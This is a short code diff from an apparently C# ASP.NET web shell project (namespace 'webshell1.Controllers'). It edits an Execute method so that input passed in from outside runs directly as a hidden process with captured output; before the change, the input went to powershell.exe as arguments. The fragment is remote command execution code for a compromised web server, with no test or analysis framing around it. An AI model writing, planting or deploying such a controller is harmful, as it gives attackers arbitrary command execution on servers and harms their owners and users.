@@ -34,8 +34,8 @@ namespace webshell1.Controllers
         private string Execute(string input)
         {
             Process process = new Process();
-            process.StartInfo.FileName = "powershell.exe";
-            process.StartInfo.Arguments = input;
+            process.StartInfo.FileName = input;
+            //process.StartInfo.Arguments = input;
             process.StartInfo.UseShellExecute = false;
             process.StartInfo.CreateNoWindow = true;
             process.StartInfo.RedirectStandardOutput = true;
